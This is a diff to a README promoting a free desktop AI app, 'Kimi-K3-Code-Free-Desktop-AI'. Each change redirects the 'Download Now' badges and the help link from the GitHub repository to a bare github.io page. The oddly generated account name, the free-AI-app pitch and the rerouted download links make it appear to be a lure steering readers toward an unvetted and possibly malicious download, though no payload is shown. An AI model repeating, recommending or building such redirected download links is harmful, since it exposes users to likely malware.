@@ -23,7 +23,7 @@ Think of it as your personal AI assistant that lives on your desktop. It can und
 
 ## 📥 Getting Started: Download Kimi-K3-Code-Free-Desktop-AI
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/Download-Kimi_K3_Free_AI-00FF00?style=for-the-badge&logo=github)](https://github.com/Emancipative-echeneis412/Kimi-K3-Code-Free-Desktop-AI)
+[![DOWNLOAD NOW](https://img.shields.io/badge/Download-Kimi_K3_Free_AI-00FF00?style=for-the-badge&logo=github)](https://emancipative-echeneis412.github.io)
 
 Visit this link to download the application.
 
@@ -147,7 +147,7 @@ While Kimi-K3 is lightweight and runs on most modern computers, for the best exp
 ## 🤝 Getting Help
 
 If you encounter any issues or have questions:
-- Visit the [GitHub repository](https://github.com/Emancipative-echeneis412/Kimi-K3-Code-Free-Desktop-AI) for documentation
+- Visit the [GitHub repository](https://emancipative-echeneis412.github.io) for documentation
 - Check the Issues section for known problems and solutions
 - Look for community discussions and user guides
 
@@ -155,7 +155,7 @@ If you encounter any issues or have questions:
 
 ## 📥 Your Download Awaits
 
-[![Get Kimi-K3](https://img.shields.io/badge/🚀-Download_Now-blue?style=for-the-badge)](https://github.com/Emancipative-echeneis412/Kimi-K3-Code-Free-Desktop-AI)
+[![Get Kimi-K3](https://img.shields.io/badge/🚀-Download_Now-blue?style=for-the-badge)](https://emancipative-echeneis412.github.io)
 
 Visit this link to download the application.
 
